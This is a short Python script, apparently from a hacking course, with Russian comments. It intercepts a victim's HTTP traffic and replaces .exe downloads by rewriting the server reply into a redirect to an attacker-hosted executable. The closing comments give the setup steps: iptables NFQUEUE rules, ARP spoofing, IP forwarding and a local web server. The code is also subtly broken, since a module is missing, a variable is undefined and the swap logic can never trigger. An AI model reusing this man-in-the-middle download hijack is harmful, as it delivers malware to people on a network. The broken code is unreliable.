#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 10000:
            if ".exe" in scapy_packet[scapy.Raw].load and "10.0.2.16" not in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
                print(scapy_packet.show())
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
                load = load.replace("HTTP/1.1", "HTTP/1.0")

        elif scapy_packet[scapy.TCP].sport == 10000:
            print("[+] Response")
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replace file")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanetly\nLocation: http://10.1.2.12/bin/evt.exe\n\n")  #тут над написать ссылку на свой хттпсервер
                packet.set_payload(str(modified_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()


#var/www/html - папка встроенного веб сервера *(помотри как его стартовать), можно конешн через питон. service apache2 start - это запустит веб сервер хы
#iptables --flush
#iptables -I FORWARD -j NFQUEUE -- queue-num 0
#переходим в папку с арп спуфером и запускаем его : python arp_spoof_mitm(arp).py
#в новом окне промта: python replace_download.py
# не забыть включить маршрутизацию: echo 1 > /proc/sys/net/ipv4/ip_forward


